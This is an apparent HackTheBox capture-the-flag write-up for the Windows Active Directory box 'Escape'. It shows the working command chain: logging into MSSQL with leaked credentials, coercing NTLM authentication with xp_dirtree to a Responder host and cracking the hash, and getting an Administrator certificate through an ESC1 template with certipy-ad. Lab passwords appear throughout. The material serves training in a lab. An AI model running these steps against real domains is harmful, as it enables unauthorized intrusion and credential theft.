---
title: Escape
date: 2026-09-18
description: Medium Windows AD box pulling MSSQL credentials from a guest-readable PDF, forcing an xp_dirtree authentication back to responder, and abusing an ESC1 certificate template for the administrator hash.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Fri Sep 18 09:24:07 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,49682,49696,49707,49728 -A -oN scan_results.txt 10.129.228.253
Nmap scan report for escape.htb (10.129.228.253)
Host is up (0.61s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 21:28:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-09-17T21:30:15+00:00; -15h56m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-17T21:30:14+00:00; -15h56m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-17T19:33:20
|_Not valid after:  2056-09-17T19:33:20
|_ssl-date: 2026-09-17T21:30:15+00:00; -15h56m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-09-17T21:30:16+00:00; -15h56m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-17T21:30:16+00:00; -15h56m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-17T21:29:38
|_  start_date: N/A
|_clock-skew: mean: -15h56m03s, deviation: 0s, median: -15h56m03s

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   622.39 ms 10.10.16.1
2   622.52 ms escape.htb (10.129.228.253)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 18 09:26:29 2026 -- 1 IP address (1 host up) scanned in 142.07 seconds

```

No LDAP anonymous bind. SMB guest login is available though — the `Public` share is readable and holds **SQL Server Procedures.pdf**. The PDF contains a test account's **username** and **password** for the MSSQL Server:

> `PublicUser - GuestUserCantWrite1`

# User

Log in to the MSSQL server:

```sh
impacket-mssqlclient sequel.htb/PublicUser:'GuestUserCantWrite1'@10.129.228.253
```

To force the SQL Server host to authenticate back to us, set up Responder:

```sh
responder -i tun0
```

Then point **xp_dirtree** at the attacker machine:

```sql
> exec master..xp_dirtree '\\10.10.16.82\share\'
```

Responder captures an NTLMv2 hash, and it cracks to:

> `sql_svc - REGGIE1234ronnie`

Gained a shell using evil-winrm.

Under `C:\SQLServer` sits a `Logs` directory holding an error log file, **ERRORLOG.BAK**:

```powershell
ps > type C:\SQLServer\Logs\ERRORLOG.BAK
```

The log reveals the username and password of ryan, who fumbled a login attempt with his creds:

> `Ryan.Cooper - NuclearMosquito3`

Gained a shell as Ryan.Cooper.

# Root 

```powershell
ps > whoami /all
```

Ryan is a member of the builtin **Certificate Service DCOM Access** group.

### Certipy-ad

**Certipy-ad** is a Python tool for enumerating and exploiting **Active Directory Certificate Services** (AD CS) vulnerabilities, commonly used in penetration testing to identify misconfigurations and attack paths in Windows domain environments.

```sh
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -enabled 
```

The vulnerable certificate details:

```sh
cat 20260918102434_Certipy.txt
```

```output
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb

...<SNIP>...

Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True

...<SNIP>...

Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins

...<SNIP>...

[!] Vulnerabilities
ESC1                              : Enrollee supplies subject and template allows client authentication.
```

With the CA name and template name in hand, request a new certificate for admin using the vulnerable template:

```sh
certipy-ad req -username Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication -upn Administrator@sequel.htb -dc-ip 10.129.228.253
```

Gained the certificate and private key as `administrator.pfx`.

```sh
faketime 'now -15 hours -56 minutes -03 seconds' certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb -dc-ip 10.129.228.253
```

The `pfx` yields a Kerberos authentication token (TGT) as `administrator.ccache`, which dumps the **NTLM hash** of the administrator the same way secretsdump does.

Gained `root`
